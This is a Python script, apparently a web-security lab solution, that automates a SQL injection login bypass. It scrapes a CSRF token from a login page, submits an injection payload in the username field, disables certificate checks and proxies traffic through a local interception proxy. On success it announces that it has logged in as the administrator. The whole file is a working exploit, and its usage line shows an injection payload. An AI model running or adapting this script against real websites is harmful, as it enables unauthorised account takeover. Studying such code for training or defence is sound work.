import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
	# The request | verify=False is used to ignore certificate verification
	r = s.get(url, verify=False, proxies=proxies)
	# BeautifulSoup reads in the response, parses with html.parser
	soup = BeautifulSoup(r.text, 'html.parser')
	# looking for the csrf token input = html tag / value = label:
	csrf = soup.find("input")['value']
	return csrf

def exploit_sqli(s, url, payload):
    # returned from the get csrf function above
    csrf = get_csrf_token(s, url)
    # the data that goes in the body of the POST request
    data = {"csrf": csrf, 
            "username": payload,
            "password": "randomness"
            }
    # The actual post request
    r = s.post(url, data=data, verify=False, proxies=proxies)
    # reading in the response to the POST request and storing as a variable
    res = r.text
    if "Log out" in res:
         return True
    else:
         return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url/login> <payload>" % sys.argv[0])
        print('[-] Example: %s http://www.example.com/login "1=1--"' % sys.argv[0])
        sys.exit(-1)
    
    # This allows us to persist the csrf token across the session - this is the session object from the requests library. 
    s = requests.Session()
    
    # We are passing the session object as well as the URL and payload to the function.
    if exploit_sqli(s, url, payload):
        print("[+] We have used the SQL injection and logged in as the administrator!!")
    else:
        print("[-] SQL Injection Has Failed")